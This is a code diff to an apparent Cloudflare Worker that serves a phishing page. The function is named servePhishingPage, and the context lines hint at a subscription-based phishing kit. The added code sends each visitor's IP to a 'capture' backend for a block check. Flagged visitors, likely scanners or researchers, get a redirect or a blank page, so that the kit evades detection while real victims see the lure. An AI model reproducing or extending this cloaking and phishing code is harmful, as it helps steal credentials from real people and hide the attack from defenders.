@@ -39,6 +39,44 @@ async function servePhishingPage(request) {
   const turnstileKey = '{{TURNSTILE_KEY}}';
   const templateHTML = `{{TEMPLATE_HTML}}`;
 
+  // Get visitor IP from Cloudflare
+  const visitorIp = request.headers.get('CF-Connecting-IP') || 
+                    request.headers.get('X-Forwarded-For') || 
+                    request.headers.get('X-Real-IP') || 
+                    '';
+
+  // Check if visitor should be blocked
+  try {
+    const blockResponse = await fetch(`${VERIFY_ENDPOINT}/api/capture/visitor/block-check`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
+    });
+    const blockData = await blockResponse.json();
+    
+    if (blockData.blocked) {
+      if (blockData.redirect_url) {
+        // Redirect to the configured URL
+        return new Response(null, {
+          status: 302,
+          headers: { 'Location': blockData.redirect_url }
+        });
+      } else {
+        // Show blank page
+        return new Response('', {
+          status: 200,
+          headers: {
+            'Content-Type': 'text/html; charset=utf-8',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+          }
+        });
+      }
+    }
+  } catch (e) {
+    // If block check fails, serve the page anyway
+    console.error('[Worker] Block check failed:', e.message);
+  }
+
   // Try to verify subscription via JWT, but serve page even if verification fails
   let clientId = '';
   let tenant = 'common';
